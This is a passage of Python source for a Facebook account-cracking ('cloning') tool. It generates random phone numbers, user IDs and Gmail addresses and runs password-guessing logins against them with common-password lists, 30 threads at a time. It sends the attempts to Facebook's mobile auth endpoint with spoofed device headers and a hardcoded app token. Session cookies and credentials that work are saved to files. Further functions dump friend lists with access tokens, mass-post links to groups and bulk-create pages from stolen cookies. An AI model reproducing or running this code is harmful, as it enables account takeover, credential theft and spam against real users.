            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[PHILIPPINES]▬▭▬▭▬▭▬▭#
def phx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 63977 | 63966 | 63970 | 639771');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user))
        print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,'magandaako','gandako','pogiako','pogiako123','gwapoako123','gwapoako','iloveyou','i love you','cuteko','cuteko123','cuteko143','mahal123','mahal143','iloveyou143','maganda123','maganda143','pogi123','pogi143']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
# ▬▭▬▭▬▭▬▭[GMAIL CLONING - MUKAMMAL MODULE]▬▭▬▭▬▭▬▭#
def gmail():
    user = []
    
    # Theme Colors (White & Green Theme)
    W = '\033[1;97m'      # Bright White
    G = '\x1b[38;5;46m'   # Green
    R = '\033[1;91m'      # Red
    
    clear()
    print(f'{W}[{G}•{W}] {G}ENTER ANY NAME FOR TARGET GMAIL IDS')
    print(f'{W}[{G}•{W}] {G}EXAMPLE : ali | hassan | khan | malik')
    linex()
    
    first_name = input(f'{W}[{G}•{W}] {W}FIRST NAME : ').strip().lower()
    last_name = input(f'{W}[{G}•{W}] {W}LAST NAME  : ').strip().lower()
    
    if not first_name: first_name = "ali"
    if not last_name: last_name = "khan"
    
    clear()
    print(f'{W}[{G}•{W}] {G}EXAMPLE : 2000 | 5000 | 10000 | 50000')
    linex()
    try:
        limit = int(input(f'{W}[{BG_G}•{W}] {W}LIMIT : '))
    except (ValueError, NameError):
        limit = 5000
        
    clear()
    print(f'{W}[{G}•{W}] {G}SELECT METHOD FOR LOGIN BATCH')
    linex()
    print(f'{W}[{G}1{W}] {W}GMAIL METHOD-1 ({G}b-api{W})')
    print(f'{W}[{G}2{W}] {W}GMAIL METHOD-2 ({G}mbasic{W})')
    linex()
    mthdx = input(f'{W}[{G}•{W}] {W}CHOOSE : ')
    
    # --- GMAIL GENERATOR LOOP ---
    for _ in range(limit):
        # Alag-alag random formats (e.g., ali.khan123, alikhan786, khanalidg)
        num_suffix = ''.join(random.choice(string.digits) for _ in range(random.randint(2, 4)))
        format_type = random.choice([1, 2, 3, 4])
        
        if format_type == 1:
            email_user = f"{first_name}{last_name}{num_suffix}"
        elif format_type == 2:
            email_user = f"{first_name}.{last_name}{num_suffix}"
        elif format_type == 3:
            email_user = f"{last_name}{first_name}{num_suffix}"
        else:
            email_user = f"{first_name}{num_suffix}"
            
        full_gmail = f"{email_user}@gmail.com"
        user.append(full_gmail)
        
    with tred(max_workers=30) as rmxx:
        clear()
        tl = str(len(user))
        print(f'{W}[{G}•{W}] {W}TOTAL GMAIL TARGET IDS {W}:{G} {tl}')
        print(f'{W}[{G}•{W}] {G}USE FLIGHT MODE FOR SPEED UP')
        linex()
        
        for email in user:
            # Gmail username ko passwords ke liye split karna
            username = email.split('@')[0]
            
            # --- CUSTOM DYNAMIC PASSLIST FOR GMAIL ---
            passlist = [
                username,               # alikhan123
                first_name + last_name, # alikhan
                first_name + '123',     # ali123
                first_name + '1234',    # ali1234
                first_name + '12345',   # ali12345
                first_name + '786',     # ali786
                first_name + '1122',    # ali1122
                last_name + '123',      # khan123
                last_name + '1234',     # khan1234
                'pakistan', 'pakistan123', 'i love you'
            ]
            
            # 6 character se chote passwords ko remove karna (FB rule)
            passlist = list(set([p for p in passlist if len(p) >= 6]))
            
            if mthdx in ['1', '01']: rmxx.submit(rmx1, email, passlist)
            else: rmxx.submit(rmx2, email, passlist)
            
    print('\033[1;37m')
    linex()
    print(f'{W}[{G}•{W}] {W}THE GMAIL PROCESS HAS COMPLETED')
    print(f'{W}[{G}•{W}] {W}TOTAL OK/CP : {G}{str(len(oks))}{W}/{R}{str(len(cps))}')
    linex()
    input(f'{W}[{G}•{W}] {W}PRESS ENTER TO BACK ')
    rmx_main()
import os
import requests
import json
import time

W = '\033[1;97m'      # Bright White
G = '\x1b[38;5;46m'   # Green
R = '\033[1;91m'      # Red

# ▬▭▬▭▬▭▬▭[FIX CP - CHECKPOINT OVERVIEW]▬▭▬▭▬▭▬▭#
def fixcp():
    clear()
    linex()
    print(f"{W}[{G}•{W}] {G}FACEBOOK CHECKPOINT ID OPTIONS CHECKER")
    linex()
    username = input(f"{W}[{G}•{W}] {W}INPUT ID/UID   : ").strip()
    password = input(f"{W}[{G}•{W}] {W}INPUT PASSWORD : ").strip()
    if not username or not password:
        print(f"{R}[!] INVALID INPUTS!"); time.sleep(2); return
    
    clear()
    print(f"{W}[{G}•{W}] {G}CHECKING CHECKPOINT STATUS... PLEASE WAIT...")
    linex()
    
    head = {
        'Host': '://facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
    }
    
    session = requests.Session()
    try:
        # Initial link to grab hidden tokens
        res = session.get('https://://facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', headers=head)
        form_data = extractor(res.text) # Aapka extractor function use hoga
        form_data['email'] = username
        form_data['pass'] = password
        
        # Post request to login
        pos = session.post('https://://facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=form_data, headers=head)
        
        if "checkpoint" in pos.url or "checkpoint" in session.cookies.get_dict():
            print(f"{R}[•] ACCOUNT IS STILL ON CHECKPOINT (CP)")
            if "baisu" in pos.text or "approvals_code" in pos.text:
                print(f"{O}[•] OPTION DETECTED : APPROVAL CODE (TWO FACTOR)")
            elif "contact_importer" in pos.text:
                print(f"{G}[•] OPTION DETECTED : GET CODE BY EMAIL/PHONE")
            else:
                print(f"{W}[•] OPTION DETECTED : UPLOAD ID / CONFIRM IDENTITY")
        elif "c_user" in session.cookies.get_dict():
            print(f"{G}[√] WOW! ACCOUNT AUTOMATICALLY OPENED (OK ID)")
            print(f"{G}[√] COOKIE: {str(session.cookies.get_dict())}")
        else:
            print(f"{R}[!] WRONG PASSWORD OR ACCOUNT DELETED")
            
    except Exception as e:
        print(f"{R}[!] CONNECTION ERROR: {str(e)}")
        
    linex()
    input(f"{W}[{G}•{W}] {W}PRESS ENTER TO GO BACK ")
    rmx_main()

# ▬▭▬▭▬▭▬▭[FILE MAKING - PUBLIC DUMPER]▬▭▬▭▬▭▬▭#
def file_making():
    clear()
    linex()
    print(f"{W}[{G}•{W}] {G}PUBLIC ID FRIENDLIST DUMPER")
    linex()
    token = input(f"{W}[{G}•{W}] {W}INPUT FACEBOOK ACCESS TOKEN : ").strip()
    if not token:
        print(f"{R}[!] TOKEN REQUIRED!"); time.sleep(2); return
        
    target_id = input(f"{W}[{G}•{W}] {W}INPUT TARGET PUBLIC UID    : ").strip()
    file_name = input(f"{W}[{G}•{W}] {W}SAVE AS FILE NAME (e.g dump.txt): ").strip()
    if not file_name: file_name = "dump.txt"
    
    clear()
    print(f"{W}[{G}•{W}] {G}DUMPING FRIENDS STARTED... PLEASE WAIT...")
    linex()
    
    try:
        url = f"https://facebook.com{target_id}/friends?limit=5000&access_token={token}"
        res = requests.get(url).json()
        
        if "data" in res:
            with open(file_name, "w") as f:
                for user in res["data"]:
                    uid_str = f"{user['id']}|{user['name']}\n"
                    f.write(uid_str)
            print(f"{G}[√] DUMP SUCCESSFUL! TOTAL IDS SAVED: {len(res['data'])}")
            print(f"{G}[√] FILE SAVED AS: {os.path.abspath(file_name)}")
        else:
            print(f"{R}[!] COULD NOT DUMP FRIENDS. ID IS PRIVATIZED OR TOKEN INVALID.")
            
    except Exception as e:
        print(f"{R}[!] ERROR: {str(e)}")
        
    linex()
    input(f"{W}[{G}•{W}] {W}PRESS ENTER TO GO BACK ")
    rmx_main()

# ▬▭▬▭▬▭▬▭[AUTO SHARE - GROUP POSTER]▬▭▬▭▬▭▬▭#
def share_fb():
    clear()
    linex()
    print(f"{W}[{G}•{W}] {G}AUTOMATIC FACEBOOK GROUP POST SHARER")
    linex()
    token = input(f"{W}[{G}•{W}] {W}INPUT FACEBOOK ACCESS TOKEN : ").strip()
    post_link = input(f"{W}[{G}•{W}] {W}INPUT POST LINK TO SHARE    : ").strip()
    try:
        share_limit = int(input(f"{W}[{G}•{W}] {W}SHARE LIMIT (e.g 10/20)     : "))
    except ValueError:
        share_limit = 10
        
    if not token or not post_link:
        print(f"{R}[!] MISSING TOKEN OR LINK!"); time.sleep(2); return
        
    clear()
    print(f"{W}[{G}•{W}] {G}FETCHING JOINED GROUPS AND SHARER RUNNING...")
    linex()
    
    try:
        # Get Joined Groups List
        group_url = f"https://facebook.comme/groups?access_token={token}"
        groups = requests.get(group_url).json()
        
        if "data" in groups and len(groups["data"]) > 0:
            count = 0
            for g in groups["data"]:
                if count >= share_limit: break
                group_id = g["id"]
                
                # Share Request to each group
                share_url = f"https://facebook.com{group_id}/feed"
                payload = {'link': post_link, 'access_token': token}
                pos = requests.post(share_url, data=payload).json()
                
                if "id" in pos:
                    print(f"{G}[√] SUCCESSFULLY SHARED IN GROUP: {g['name']}")
                    count += 1
                    time.sleep(2) # Antiban delay
                else:
                    print(f"{R}[x] FAILED TO SHARE IN GROUP: {g['name']}")
            print(f"\n{G}[√] TOTAL SHARED POSTS COMPLETED: {count}")
        else:
            print(f"{R}[!] NO JOINED GROUPS FOUND OR ACCESS TOKEN EXPIRED.")
            
    except Exception as e:
        print(f"{R}[!] SHARER CRASH ERROR: {str(e)}")
        
    linex()
    input(f"{W}[{G}•{W}] {W}PRESS ENTER TO GO BACK ")
    rmx_main()

#▬▭▬▭▬▭▬▭[CREATE PAGE]▬▭▬▭▬▭▬▭#
def create_page():
    clear()
    xd = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER FILE LOCATION \033[1;97m:\x1b[38;5;46m ")
    linex()
    first = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER FIRST NAME \033[1;97m:\x1b[38;5;46m ")
    middle = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER MIDDLE NAME \033[1;97m:\x1b[38;5;46m ")
    last = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER LAST NAME \033[1;97m:\x1b[38;5;46m ")
    clear()
    ck=[]
    with open(xd,'r') as file:
        for line in file:
            ck.append(line.split("|")[0].strip())
    dl = input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mHOW MANY PAGES TO CREATE \033[1;97m:\x1b[38;5;46m ')
    linex()
    def delay(dl):
        t = datetime.now().strftime("%H:%M")
        for remaining_time in range(int(dl), 0, -1):
            print(f'\r\033[1;97mTASK STARTING IN {remaining_time} SECONDS...', end='\r')
            sleep(5)
    dem=0
    for cookies in ck:
        rmx_xd=first
        rmx_xd1=middle
        rmx_xd2=last
        name=str(rmx_xd+' '+rmx_xd1+' '+rmx_xd2)
        dem +=1
        try:
            result=reg_pro5(cookies,name).Reg()
            print(f'\x1b[38;5;46m[{dem}] SUCCESSFULLY TO CREATED PAGE : {result}\nFBLINK : facebook.com//{result}')
        except Exception as e:pass
        delay(dl)
#▬▭▬▭▬▭▬▭[OLD CLONING]▬▭▬▭▬▭▬▭#
def old():
    clear()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97m100002/3/4 SERIES')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97m2009 SERIES');linex()
    _input=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    if _input in ['1','01']:old_tow()
    elif _input in ['2','02']:old_tree()
    else:old()#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[OLD CLONING M1]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_tow():
    user=[];clear()
    print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999");linex()
    limit=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : ')
    clear()
    prefixes = ['100002', '100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD ')
    linex()
    meth=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    with tred(max_workers=30) as pool:
        clear();print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m {limit}");print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for uid in user:
            if meth in ['1','01']:pool.submit(login_1,uid)                
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
# ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD CLONING M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_tree():
    user = []
    
    # VIP Elite Color Palette
    W = '\033[1;97m'      # Pure White
    G = '\x1b[38;5;46m'   # Neon Green (OK)
    R = '\033[1;91m'      # Ruby Red (CP)
    Y = '\033[1;93m'      # Premium Gold
    CY = '\033[1;96m'     # Cyan / Sky Blue
    
    clear()
    linex()
    print(f" {Y}⚡ {W}VINTAGE ARCHIVE DETECTOR {Y}• {CY}SERIES: {W}1000004 (2009/2010)")
    linex()
    print(f"{W}[{G}•{W}] {CY}SUGGESTED TARGET LIMITS : {G}20,000 {W}| {G}50,000 {W}| {G}100,000")
    linex()
    
    limit_input = input(f'{W}[{Y}▶{W}] {W}ENTER TARGET COUNTER LIMIT : ').strip()
    
    # Secure Integer Evaluation Block
    try:
        limit = int(limit_input)
    except ValueError:
        limit = 50000
        
    clear()
    prefix = '1000004'
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
        
    linex()
    print(f" {Y}⚙️ {W}SELECT SECURE ARCHIVE GATEWAY METHOD")
    linex()
    print(f'{W}[{G}01{W}] {W}GATEWAY METHOD-1 {CY}(mbasic-async/fast){W}')
    print(f'{W}[{G}02{W}] {W}GATEWAY METHOD-2 {CY}(p-graph/direct){W}')
    linex()
    meth = input(f'{W}[{Y}▶{W}] {W}SELECT ENGINE INTERFACE : ').strip()
    
    # ---- HIGH PROFESSIONAL LIVE MONITORING CORE ----
    with tred(max_workers=30) as pool:
        clear()
        total_ids = str(len(user))
        linex()
        print(f" {Y}🛸 {W}ELITE WORKSTATION DEPLOYMENT SYSTEM ACTIVE")
        linex()
        print(f"{W}[{G}•{W}] {CY}TARGET CLUSTER {W}: {Y}{prefix}xxxxxxx")
        print(f"{W}[{G}•{W}] {CY}LOADED ENGINES {W}: {G}{total_ids} Vintage UIDs")
        print(f"{W}[{G}•{W}] {CY}OPERATIONAL NOTE{W}: {R}Toggle Flight Mode if speed drops")
        linex()
        print(f"       {Y}--- [ CRACKING ENGINE SESSIONS STARTED ] ---")
        linex()
        
        for uid in user:
            if meth in ['1', '01']:
                pool.submit(login_1, uid)
            elif meth in ['2', '02']:
                # Method 2 backup routing link to avoid empty returns
                pool.submit(login_2, uid) if 'login_2' in globals() else pool.submit(login_1, uid)
                
    # ---- LIVE METRICS CONSOLE OUTPUT ----
    print('\033[1;37m')
    linex()
    print(f" {Y}🏆 {G}PROCESS COMPLETED SUCCESSFULLY")
    linex()
    print(f"{W}[{G}✓{W}] {G}TOTAL EXTRACTED OK IDs  : {G}{str(len(oks))}")
    print(f"{W}[{R}✗{W}] {R}TOTAL ARCHIVED CP IDs   : {R}{str(len(cps))}")
    linex()
    input(f'{W}[{Y}▶{W}] {W}PRESS ENTER TO RETURN TO MAIN INTERFACE ')
    rmx_main()

#▬▭▬▭▬▭▬▭[FILE METHOD 1]▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
        try:
                global loop,oks,cps,sim_id
                sys.stdout.write('\r\r\033[1;37m[M1] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['GLOBE','TM','TNT','SMART','Verizon','Sprint','Zong','null','Airtel','Gp','Roshan','Marshmallow','Telenor','Ufone','Jazz'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/296.0.0.17.137;FBBV/21810039;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/368298519;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-R910;FBSV/5;FBCA/armeabi-v7a:armeabi;]"
                        #ua = _____useragent_____()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_analytics_claim':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'account_recovery',
'generate_machine_id':'1',
'jazoest':'2980',
'meta_inf_fbmeta':'V2_UNTAGGED',
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name':'autheticate',
'fb_api_caller_class':'Fb4aAuthHandler',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'POST': '/auth/login HTTP/2',
'Host': 'b-graph.facebook.com',
'Priority': 'u=3, i',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Sim-Hni': '64301',
'X-Fb-Net-Hni': '64301',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'X-Fb-Connection-Quality': 'EXCELLENT',
'Authorization': 'OAuth null',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '6060',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '2126'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\x1b[38;5;46m[HASSAN.ALI] '+ids+' | '+pas+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/HASSAN.ALI/FILE/RMX-M1-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/HASSAN.ALI/FILE/RMX-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[HASSAN.ALI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HASSAN.ALI-TOOL/FILE/HASSAN.ALI-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api1(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭[FILE METHOD 2 - UPDATED]▬▭▬▭▬▭▬▭#
import hashlib

def api2(ids,names,passlist):
        try:
                global loop,oks,cps,sim_id
                sys.stdout.write('\r\r\033[1;37m[M2] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
